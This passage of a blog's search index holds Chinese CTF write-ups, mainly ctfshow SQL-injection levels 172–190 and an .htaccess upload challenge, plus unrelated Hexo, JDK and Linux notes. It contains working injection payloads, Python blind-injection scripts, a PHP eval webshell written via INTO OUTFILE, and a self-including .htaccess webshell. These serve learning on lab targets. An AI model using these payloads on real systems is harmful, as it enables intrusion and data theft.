0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125;\n\n\n\n\n\nweb344最后一个题目竟然不是原型链污染，直接来看代码\nrouter.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag = &#x27;flag_here&#x27;;  if(req.url.match(/8c|2c|\\,/ig))&#123;  \tres.end(&#x27;where is flag :)&#x27;);  &#125;  var query = JSON.parse(req.query.query);  if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123;  \tres.end(flag);  &#125;else&#123;  \tres.end(&#x27;where is flag. :)&#x27;);  &#125;&#125;);\n\nreq.query.query这个代码获取到请求头的请求参数的query，也就是get传参query。一开始我以为就是发送个json数据即可，但是发现逗号被过滤了。我就没见过Json数据不用逗号隔开的\n虽然json数据在URL传输的时候会被编码，但是把%2c也给过滤了\n只能去看大佬的payload\n?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;\n\n首先就是node.js处理req.query.query的时候，它不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse居然会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析，因此这样分开来传就可以绕过逗号了。至于c那个之所以要再进行url编码成%63,就是因为前面的%22，会造成%22c，正好ban了2c，所以c也需要进行url编码。学到了学到了，很有意思的特性。\napp.get(&#x27;/&#x27;, (req, res) =&gt; &#123;  console.log(req.query);//看来是会将传参拼接起来  // 输出: &#123; query: [ &#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#x27;, &#x27;&quot;password&quot;:&quot;ctfshow&quot;&#x27;, &#x27;&quot;isVIP&quot;:true&#125;&#x27; ] &#125;    // query是一个数组，因为同名参数出现了多次  const queryArray = req.query.query;  console.log(queryArray[0]); // &#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#x27;  console.log(queryArray[1]); // &#x27;&quot;password&quot;:&quot;ctfshow&quot;&#x27;  console.log(queryArray[2]); // &#x27;&quot;isVIP&quot;:true&#125;&#x27;&#125;);\n\n\n\n","tags":["js原型链污染","js代码审计","js命令执行"]},{"title":"ctfshowSQL注入","url":"/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/","content":"ctfshow_SQL注入笔记前言最近要再去学一下MySQL，就顺便把ctfshow上面的题目做了，再去学一下sqlmap的用法。\n主要是因为以前SQL注入全是在靶场上进行的，学的基本上就是一些简单的绕过方法，和实际做题感觉有很大区别\n172关1.用户名过滤$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;//检查结果是否有flag    if($row-&gt;username!==&#x27;flag&#x27;)&#123;      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;    &#125;\n\n这个sql语句和闭合都是非常简单的，不同的是我们无法直接拿到flag，只有在查询结果的用户名不为flag才能查询成功\n&#x27;  order by 2 --+ //首先判断其为2字段\n\n但表格为3字段，也就是说实际上有3字段只不过，只能用两个字段进行排序\n若表中实际有 3 列但存在隐藏字段或视图限制，可能导致误判，也就是说可能是id被隐藏和限制了\n但是，我们这次可以看到sql语句的源码，我们发现在前面有select username,password这句话，也就意味着查询结果指定了只有两个字段\n\n\n这种情况，我们只需要不用username进行联合查询即可，id可以换成任意\n1&#x27;  union select 1,password from ctfshow_user3 --+\n\n174关//拼接sql语句查找指定ID用户$sql = &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;//检查结果是否有flag    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;    &#125;\n\n这题对于回显数据，过滤掉了flag和含数字的结果\n1.数字过滤我看网上很多人写了sql注入的脚本，莫非脚本才是主流解法吗，可是我python都没怎么写过\n方法1这道题目首先可以使用盲注，我只介绍一下思路，毕竟太麻烦了，等我学会写盲注脚本就一切都结束了\n首先我们可以通过题目回显来判断语句的对错\n1&#x27; and 1=1 --+ #正常回显1&#x27; and 1=2 --+ #错误回显\n\n于是我们可以通过盲注的步骤依次推断出flag\npayload = f&quot;1 or ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;# &quot; #查库#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;note&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot; #查表#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;fl4g&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot; #查列#payload = f&quot;1&#x27; or ascii(substr((seleCt(flag)from(fl4g)),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot; #查数据\n\n方法2\n这次是过滤了数字，我们可以利用sql中的replace()函数将数字进行替换即可\nreplace()\nREPLACE(string_expression, search_string, replacement_string)\n\n参数说明：\n\nstring_expression：原字符串（支持字符或二进制数据）。\nsearch_string：需要被替换的子串。\nreplacement_string：替换后的新内容。若为空，则删除所有search_string\n\n实例\nSELECT REPLACE(REPLACE(&#x27;30AB&#x27;, &#x27;A&#x27;, &#x27;01&#x27;), &#x27;B&#x27;, &#x27;02&#x27;);  -- 结果：&#x27;300102&#x27;\n\n我们可以和上面一样，把所有数字替换为对应的字符即可\n&#x27; unionselect &#x27;a&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;1&#x27;,&#x27;$A&#x27;),&#x27;2&#x27;,&#x27;$B&#x27;),&#x27;3&#x27;,&#x27;$C&#x27;),&#x27;4&#x27;,&#x27;$D&#x27;),&#x27;5&#x27;,&#x27;$E&#x27;),&#x27;6&#x27;,&#x27;$F&#x27;),&#x27;7&#x27;,&#x27;$G&#x27;),&#x27;8&#x27;,&#x27;$H&#x27;),&#x27;9&#x27;,&#x27;$I&#x27;),&#x27;0&#x27;,&#x27;$J&#x27;)from ctfshow_user4where username = &#x27;flag&#x27;%23\n\n然后把拿到的结果进行替换回来即可\n\n\n175关$sql = &quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;  if(!preg_match(&#x27;/[\\x00-\\x7f]/i&#x27;, json_encode($ret)))&#123;      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;    &#125;\n\n这题匹配到了ascii的127位，也就是数字和字母全都被过滤掉了，相应的也可以用盲注，但还是太麻烦了\n1.into outfile()导出数据这个就是通过导出查询数据到网站根目录下，写入一句话木马然后通过蚁剑进行一个数据库操作拿到flag\n我们先写马\n&#x27; union select 1,&quot;&lt;?php eval($_POST[1])?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/1.php&#x27; --+本来这样应该可以执行成功的但不知道什么问题，估计是一句话木马出现了什么特殊字符，直接编码算了先进行base64编码再url编码&#x27; union select           1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%68%63%4a%46%39%51%54%31%4e%55%57%7a%46%64%4b%54%38%2b&quot;) INTO OUTFILE &#x27;/var/www/html/3.php&#x27; --+\n\n我服了这个老六，妈的写进去了还是接口错误，我都不知道我是哪句话写进去的，只能重新做一遍\n事实证明，第一句话就是对的，执行了但是不知道为什么还是接口错误，总之都是可以执行的\n我们可以通过查看连接文件拿到用户名和密码\n\n\n最后拿到flag\n\n\n\n\n我们可以把查询结果写入文件，当然也可以直接查flag然后写入文件\n&#x27; union select username, password from ctfshow_user5 into outfile &#x27;/var/www/html/flag.txt&#x27; %23\n\n177关$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;function waf($str)&#123;   //代码过于简单，不宜展示  &#125;\n\n这次题目绕过了空格，之前sqli-lab出现过这种情况，但没有仔细注意，这里就总结一些绕过空格的方法\n1.空格过滤%0a回车   %09 tab  %0c 换页 /**/ 注释 /n换行符 /t制表符\n\n有些地方也可以省略空格，比如\n&#x27; union/**/select&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;%23#select 后面使用引号隔绝\n\n还需要注意的是在sql语句中+会被看作空格，所以注释不能用–+\n反引号\n有一些场景也可以用反引号代替，我们先看一下sql语句里面的反引号\n转义标识符当数据库表名、字段名等标识符与 SQL 保留关键字冲突（如 order、select）或包含 特殊字符（如空格、连字符）时，用反引号包裹可避免语法错误。\n也就是说，分隔表名和字段名的时候可以使用反引号\n#虽然直接用万能密码也能过，但大多数时候只会返回一行，所以还是直接找到flag比较好&#x27;union/**/select&#x27;1&#x27;,&#x27;2&#x27;,group_concat(password)/**/from%0actfshow_user/**/where/**/username=&#x27;flag&#x27;%23用了各种方法，都可以替换\n\n181关前面几关都好水，全都是空格过滤，虽然这关也差不多，不过我发现有个奇怪的地方\n$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;  function waf($str)&#123;    return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i&#x27;, $str);  &#125; function waf($str)&#123;    return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i&#x27;, $str);  &#125;\n\n按理来说是把我之前的空格全部过滤掉了，但是不知道为什么%0c还是可以用\n&#x27;or%0cusername=&#x27;flag\n\n\n\n\n\n虽然这样也可以，但是这就是个bug，作者出来挨打\n网上也有无bug的写法，就是用括号\nid=-1&#x27;or(username=&#x27;flag&#x27;)and&#x27;1&#x27;=&#x27;1\n\n183关 开始写脚本了$sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;function waf($str)&#123;   return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i&#x27;, $str); &#125;$user_count = 0;\n\n这个把该过滤的全部过滤掉了，还过滤掉了所有空格，我们只能通过盲注来推断出flag的具体内容，直接复制别人的脚本是没有意义的，我直接上手，我们根据是否返回值判断字符\n\n\n我们首先使用POST请求查找flag，发现成功返回一行\ntableName=(ctfshow_user)where(pass)like&#x27;%25c%25&#x27;#需要注意的是，like后面的内容需要用引号引起来，而且在url编码中%属于特殊字符我们&#x27;%c%&#x27;必须进行编码为&#x27;%25c%25&#x27;\n\n成功找到注入语句后就可以开始写脚本了\n这是我人生中写的第一个脚本\nimport requestsurl=&#x27;http://03b69989-d73e-4cb6-8dcc-51fad125e7e2.challenge.ctf.show/select-waf.php&#x27;flagstr=&#x27;&#123;abcdefghijklmnopqrstuvwxyz-1234567890&#125;&#x27;flag=&#x27;&#x27;for i in range(1,50):    for j in flagstr:        data=&#123;            &#x27;tableName&#x27;:&quot;(ctfshow_user)where(pass)regexp(\\&#x27;ctfshow&#123;&#125;\\&#x27;)&quot;.format(flag+j)        &#125;        response=requests.post(url,data=data)        if response.text.find(&quot;user_count = 1;&quot;)&gt;0:            flag+=j            print(flag)            break\n\n具体原理就是查找flag再进行正则匹配，使用占位符{}和.format(flag+j)实现查找，然后输出正确的查找结果\n这个脚本不是特别完善，但也是开始了\n184关$sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;function waf($str)&#123;   return preg_match(&#x27;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\&#x27;|\\&quot;|union|\\`|sleep|benchmark/i&#x27;, $str); &#125; $user_count = 0;\n\n这题和上一题的思路不同了，但这次把空格放出来了，同时也多过滤了where和select，根据我现在看是无法直接把flag找出来了，看了题解试下right join 联合查询，那样就不需要使用where了\n1.having在 SQL 中，HAVING 子句用于对分组后的结果进行过滤，通常与 GROUP BY 结合使用。having和where都是用于查询的子句\nSELECT 列1, 聚合函数(列2)FROM 表 GROUP BY 列1HAVING 聚合条件;\n\nHAVING 允许使用聚合函数（如 SUM、COUNT、AVG 等）对分组后的数据进行条件筛选。\n实例\nSELECT StudentID, AVG(Grade) AS AvgGrade FROM Scores GROUP BY StudentID HAVING AVG(Grade) &gt; 80;\n\n与where的区别\n\n\n\n特性\nWHERE\nHAVING\n\n\n\n作用阶段\n在数据分组前过滤单行记录\n在分组后过滤组数据\n\n\n能否使用聚合函数\n❌ 不能\n✅ 可以\n\n\n执行顺序\n先于 GROUP BY 和 HAVING\n后于 GROUP BY，先于 ORDER BY\n\n\n字段别名支持\n不支持别名，只能用原始字段名\n同上\n\n\nHAVING 通常依赖 GROUP BY 定义的分组逻辑，但若未显式使用 GROUP BY，则默认将整个表视为一个组\nSQL 查询的执行顺序为：WHERE → GROUP BY → 聚合函数 → HAVING → SELECT → ORDER BY\n即使 SELECT 中定义了别名（如 Total），HAVING 仍需使用原始字段名或聚合表达式\n于是，再有可以替换where后，我开始尝试找flag\n\n\n如果不加group by则有22行，加了以后只有1行了。一开始我以为我自己出错了，但在本地试了一下，语句没错。那就只有一种可能了，就是只有flag有pass，其他全为null\n我们继续使用having找flag，由于’ ‘被过滤了，我们只能使用编码来代替正则表达式\n我们把ctfshow{用16进制编码为63746673686f777b，然后在前面加上0x代表16进制则可以绕过引号。我们利用这个进行尝试\n\n\n理论成立实践开始\nimport requestsurl=&#x27;http://a08ad03a-930e-432e-bcf7-badfdada1865.challenge.ctf.show/select-waf.php&#x27;flagstr=&#x27;&#123;abcdefghijklmnopqrstuvwxyz-1234567890&#125;&#x27;flag=&#x27;&#x27;str=&#x27;&#x27;k=&#x27;&#x27;for i in range(1,50):    for j in flagstr:        k=hex(ord(j))[2:]        #ord()把字符转为uniocode编码和ascii编码差不多        #hex将编码转为16进制        #[2:]截取从第3个字符开始，把0x去掉        data=&#123;            &#x27;tableName&#x27;:&quot;ctfshow_user group by pass having pass regexp(0x&#123;&#125;)&quot;.format(flag+k)        &#125;        response=requests.post(url,data=data)        if response.text.find(&quot;user_count = 1;&quot;)&gt;0:            flag+=k            #连接的是16进制            str+=j            print(str)            break\n\n\n\n这里有个很奇怪匹配，奇怪的就是我觉得有道理又没道理\n好吧，现在解决了，把字典改为\nctfshow&#123;abdegijklmnpqrstuvxyz-1234567890&#125;\n\n就可以跑满了\n185关终于到了185关了，这也是我做到的第一个还没被解出来的题目，之前的题目都被做过一遍了，毫无感觉。现在它来了\n$sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;function waf($str)&#123;   return preg_match(&#x27;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\&#x27;|\\&quot;|union|\\`|sleep|benchmark/i&#x27;, $str); &#125;\n\n这次过滤的也很多，和上一把不同的是这次过滤掉了数字，但having还可以用，我们还是可以进行正则匹配\n没有数字就使用其他东西替代。在sql中true默认为1，false默认为0，当我们进行concat()\n\n\n我们就拼凑出了数字10\n\n\n当我们在中间使用加号时我们就可以拼出2，也就是说我们可以把flag中的数字全都用true，+，false的方法拼出来。这样的话就可以直接匹配flag了，还不需要编码\n具体思路就是将字典的数字放在最后面，每当循环到数字的时候就n个true相加，代替数字n。\n不得不说，我犯了个错误，我想实现字母和数字拼接就需要\nselect concat(&#x27;a&#x27;,true);\n\n但是引号被过滤掉了，不得不用true表示字母，不加引号就会把字母作为列名识别\n现在新的思路就是将数字和字母都通过true表示ascii码值，然后通过sql中的chr()将ascii码值转化为字符\nimport requestsurl=&#x27;http://2597138c-e85b-4634-bdaf-7977f0665323.challenge.ctf.show/select-waf.php&#x27;flagstr=&#x27;&#123;abcdefghijklmnopqrstuvwxyz-&#125;0123456789&#x27;def creatnum(n):    str=&#x27;true&#x27;    if n==1 :        return &#x27;true&#x27;    else :        for i in range(n-1) :            str+=&#x27;+true&#x27;    return strdef flagstring(str):    str1=&#x27;&#x27;    str1=&#x27;,char(&#x27;+creatnum(ord(str))+&#x27;)&#x27;    return str1def flagone(str):    str1=&#x27;&#x27;    str1=&#x27;char(&#x27;+creatnum(ord(str))+&#x27;)&#x27;    return str1flag=&#x27;&#x27;result=&#x27;&#x27;anser=&#x27;&#x27;# count=flagone(&#x27;c&#x27;)# print(count)for i in range(1,50):    if i==1 :        for k in flagstr:            print(k)            result=flagone(k)            #print(result)            data = &#123;                &#x27;tableName&#x27;: &quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;.format(result)            &#125;            response = requests.post(url, data=data)            if response.text.find(&quot;user_count = 1;&quot;) &gt; 0:                flag += k                print(flag)                anser += result                break    else:     for j in flagstr:        result=flagstring(j)        data=&#123;            &#x27;tableName&#x27;:&quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;.format(anser+result)        &#125;        response=requests.post(url,data=data)        if response.text.find(&quot;user_count = 1;&quot;)&gt;0:            flag+=j            print(flag)            anser+=result            break#ctfshow&#123;ac59f610-21f1-449a-81d4-b4bfaf6b88c8&#125;\n\n写是写出来了，先来一个胜利结算画面\n\n\n这里题目我感觉出现了问题，我拿脚本跑出来的数据去浏览器上验证的时候发现无论怎么样都是0，看b站上的教程也是0，但自己用脚本却可以跑出来，还是作者出来挨打，186题听说也差不多，直接跑就行了\n我还是写一下思路吧，一开始我只是把每个字符用true来表示，但后面发现问题\n,char(true........)\n\n第一个字符前面会有一个’,’，我不知道怎么办，只能把第一个字符用if语句单独拿出来，然后重新写一个前面没有逗号的函数\n后面的就和以前一样\n\n\n刚才突然有灵感找到问题了，我在pycharm时由于太长了直接把那一行都复制下来了，导致最后面有一个看不见的回车，编码去掉以后就可以了\n还有之前python没跑成的原因是网址填错了，填了猫的网址\n187关 md5万能密码$sql = &quot;select count(*) from ctfshow_user where username = &#x27;$username&#x27; and password= &#x27;$password&#x27;&quot;; $username = $_POST[&#x27;username&#x27;];    $password = md5($_POST[&#x27;password&#x27;],true);    //只有admin可以获得flag    if($username!=&#x27;admin&#x27;)&#123;        $ret[&#x27;msg&#x27;]=&#x27;用户名不存在&#x27;;        die(json_encode($ret));    &#125;\n\n这个题目admin直接告诉我们了，但password不仅没有告诉我们，还进行了二进制转换，就算拿到了密码，进过md5()二进制转换也不好匹配，至于题解则是网上传的密码\nusername=&#x27;admin&#x27;password=&#x27;ffifdyop&#x27;\n\n只知道md5()是加密函数，加密机制也不知道，自己去反推密码肯定不行\n\n\n这就是输出的结果\nselect count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or&#x27;6�]��!r,��b\u001c&#x27;\n\n\n\n主要有两个特征，一是构造了万能密码’or’，这样就形成了闭合，二就是后面是字符串，根据mysql弱类型比较开头数字就是转换结果，所以成功拿到数据\n还有就是这几题flag都不会直接出现在页面上，需要抓包然后用重发器拿到\n188关 弱类型$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;; //用户名检测  if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\&#x27;|\\&quot;/i&#x27;, $username))&#123;    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;    die(json_encode($ret));  &#125;  //密码检测  if(!is_numeric($password))&#123;    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;    die(json_encode($ret));  &#125;  //密码判断  if($row[&#x27;pass&#x27;]==intval($password))&#123;      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;      array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));    &#125;\n\n这个有一个和以前题目都不一样的地方，就是sql语句里面是直接&#x3D;变量，并没有用’’包起来，也就是当我们输入0时，会变成\nselect pass from ctfshow_user where username = 0\n\n由于等号的一端是0，所以username会被松散比较，由于用户名都是字母开头所以会返回所有以字母开头的用户名\npass则是php的松散比较，pass开头也是字母，我们只要保持intval($password)&#x3D;0就可以绕过\n\n\n189关  读取文件这个题目也是一个POST请求，和188关一样，username没有引号包裹\n$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;if(preg_match(&#x27;/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123;    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;    die(json_encode($ret));  &#125;  //密码检测  if(!is_numeric($password))&#123;    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;    die(json_encode($ret));  &#125;  //密码判断  if($row[&#x27;pass&#x27;]==$password)&#123;      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;    &#125;      \n\n这题当我们输入错误的内容时有两种回显，查询失败和密码错误。即用户名是否正确，根据弱类型匹配当我们输入0时会匹配字母开头的用户名，1则匹配不到，所以我们可以利用0和1的差异进行布尔盲注\n0\\u5bc6\\u7801\\u9519\\u8bef  密码错误1\\u67e5\\u8be2\\u5931\\u8d25  查询失败\n\n题目提示到flag在api&#x2F;index.php文件当中，我们可以利用locate()和load_file()函数读取并把flag盲注出来\n我们先来构造注入语句\nlocate(&#x27;ctfshow&#x27;,load_file(&#x27;/var/www/html/api/index.php&#x27;))\n\n\n\n语句执行成功，开始写脚本\nimport requestsurl=&#x27;http://e6fcf495-f921-4eea-b823-209cf14eb6ed.challenge.ctf.show/api/index.php&#x27;flagstr=&#x27;&#123;abcdefghijklmnopqrstuvwxyz-1234567890&#125;&#x27;flag=&#x27;&#x27;for i in range(1,50):    for j in flagstr:        data=&#123;            &#x27;username&#x27;:&#x27;locate(&quot;ctfshow&#123;&#125;&quot;,load_file(\\&#x27;/var/www/html/api/index.php\\&#x27;))&#x27;.format(flag+j),            &#x27;password&#x27;:&#x27;1&#x27;        &#125;        response=requests.post(url,data=data)        #print(response.text)        if response.text.find(&quot;8d25&quot;)&gt;0:            flag+=j            print(flag)            break\n\n虽然是自己写出来的，但是中间有一个很简单的地方卡了一下，就是我们看bp抓包是把POST请求送到&#x2F;api&#x2F;index,php文件里面，所以我们也需要把请求发送到那里，而不是输入界面\n还有就是我没有用if语句但实际上也可以用\nif(locate(&#x27;ctfshow&#x27;,load_file(&#x27;/var/www/html/api/index.php&#x27;)),1,0)\n\n我们也可以直接使用正则匹配代替locate()\nload_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#123;&#125;)\n\n\n\n190关 布尔盲注这题可以说是真正意义上的布尔盲注，和我当初在sqli-lab上的布尔盲注差不多\n$sql = &quot;select pass from ctfshow_user where username = &#x27;&#123;$username&#125;&#x27;&quot;;if(!is_numeric($password))&#123;    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;    die(json_encode($ret));  &#125;  //密码判断  if($row[&#x27;pass&#x27;]==$password)&#123;      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;    &#125;\n\n这次username用引号引起来了，所以不能通过189关1和0(弱类型匹配)的布尔盲注了，而且189关flag是放在index.php文件里面，我们可以直接读取文件进行布尔盲注。我们只能使用闭合，然后通过select查询是否为真判断盲注结果\n我们先抓个包看一下发到哪个文件\n\n\n还是发到&#x2F;api&#x2F;index.php文件，我们再看一下不同状态的回显\n&#x27; or 1=1 #\\u5bc6\\u7801\\u9519\\u8bef 密码错误&#x27; or 1=2 #\\u7528\\u6237\\u540d\\u4e0d\\u5b58\\u5728 用户名不存在\n\n于是我们可以先构造盲注语句\n#我们可以通过看sql语句或union select 1,2判断字段数ascii(substr(select database(),0,1))#我们通过这样拿字符进行ascii码的比较，可以使用二分法判断出其ascii码值\n\n\n\n自从去年新生赛之后就没写过二分法了，这次还是用python写\nimport requestsurl=&#x27;http://eee245d2-d3ab-4aaf-a908-6d2946ac51b0.challenge.ctf.show/api/index.php&#x27;flag=&#x27;&#x27;for i in range(1,50):    low = 32    high = 127    while low&lt;high :        mid = (low + high) // 2        data=&#123;            #select group_concat(flag) from ctfshow_fl0g            #select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;            #select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;            &#x27;username&#x27;:f&quot;&#x27;or if(ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&quot;,            &#x27;password&#x27;:&#x27;1&#x27;        &#125;        r=requests.post(url,data=data)        if &#x27;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&#x27; in r.text:            low =mid+1            #我们这里选择low=mid+1的原因是触发原因是&gt;mid，当low,high时mid=low，如果&gt;mid则ascii=high#相应的如果选择&lt;mid作为触发条件则是high=mid和low=midjiao        else :            high = mid    if low!=32:        flag+=chr(low)        print(flag)    else :     break#拿到数据库 ctfshow_web#拿到表名  ctfshow_fl0g,ctfshow_user#爆字段 ctfshow_user:id,username,pass ctfshow_fl0g:id,f1ag\n\n\n\n花了一个小时，终于对着大佬的脚本把我的脚本完成了，这个脚本需要注意的地方主要是二分法的原理和一下sql注入的细节\n"},{"title":"Hello World","url":"/2024/12/06/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"htaccess","url":"/2025/06/08/htaccess/","content":"htaccess文件payload前言这个文件专门来放.htaccess文件的payload，不然根本记不住。\n[JMCTF 2021]UploadHub&lt;FilesMatch .htaccess&gt;SetHandler application/x-httpd-php Require all granted  php_flag engine on\t&lt;/FilesMatch&gt;php_value auto_prepend_file .htaccess#&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n这段 .htaccess 文件的内容是一个恶意配置，旨在通过Apache的配置文件实现PHP代码执行\n我们之前见过.htaccess文件自己包含自己的题目，但是这个题目好像有点不一样，在配置文件中设置了所有文件都不能被解析为php，但是我们可以通过.htaccess文件改变这个项\n&lt;FilesMatch .htaccess&gt;    SetHandler application/x-httpd-php  # 将.htaccess文件当作PHP脚本解析    Require all granted                # 允许所有访问（绕过权限限制）    php_flag engine on                 # 强制开启PHP引擎（即使被全局关闭）&lt;/FilesMatch&gt;\n\n\n\n&lt;FilesMatch .htaccess&gt;SetHandler application/x-httpd-php Require all granted  php_flag engine on\t&lt;/FilesMatch&gt;php_value auto_prepend_file .htaccess#&lt;?php var_dump(file_get_contents(&#x27;/flag&#x27;));?&gt;\n\n"},{"title":"kali中更换JDK版本","url":"/2025/12/14/kali%E4%B8%AD%E6%9B%B4%E6%8D%A2JDK%E7%89%88%E6%9C%AC/","content":"kali中更换JDK版本Linux系统中有些操作还是比Windows系统复杂一点，装个Java都把我装懵逼了\n1.下载JDK为了做题，我下载的是JDK11\n\n\n记得下载linux系统的，我们进行解压之后可以存放至&#x2F;opt目录下，这个目录是Linux专门用来安装外来软件，也就是不是通过kali安装的，和Windows的自定义安装路径差不多，我们安装的文件可以自己管理\n放到目录下之后我们直接进行注册即可\nsudo update-alternatives --install /usr/bin/java java /opt/jdk-11.0.29/bin/java 1# 将 /opt/jdk-11.0.29/bin/java 注册为 java 命令的一个候选版本。注册解释器 优先级为1sudo update-alternatives --install /usr/bin/javac javac /opt/jdk-11.0.29/bin/javac 1# 将 /opt/jdk-11.0.29/bin/javac 注册为 javac 命令的一个候选版本。注册编译器sudo update-alternatives --set java /opt/jdk-11.0.29/bin/java# 将系统默认的 java 命令指向 JDK 11.0.29。sudo update-alternatives --set javac /opt/jdk-11.0.29/bin/javac# 将系统默认的 javac 命令指向 JDK 11.0.29。\n\n然后我们执行命令可以看到我们Java的各个版本\nupdate-alternatives --config java\n\n可以看到我们已将注册好Java和优先级了\n\n"},{"title":"linux命令","url":"/2025/02/01/linux%E5%91%BD%E4%BB%A4/","content":"linux命令笔记前言目前对linux命令感到抽象，因为我是windows系统，而且我没装虚拟机，感觉好难装，但是没装不影响学，可以使用在线命令\n1.linux系统目录结构1.Linux一切皆文件\n2.只有一个顶级目录，不像windows分C盘、D盘、E盘\n于是linux系统结构：\n\n\n以下是对这些目录的解释：\n\n&#x2F;bin：  bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。\n\n&#x2F;boot：  这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。\n\n&#x2F;dev ：  dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。\n\n&#x2F;etc：  etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。\n\n&#x2F;home：  用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。\n\n&#x2F;lib：  lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。\n\n&#x2F;lost+found：  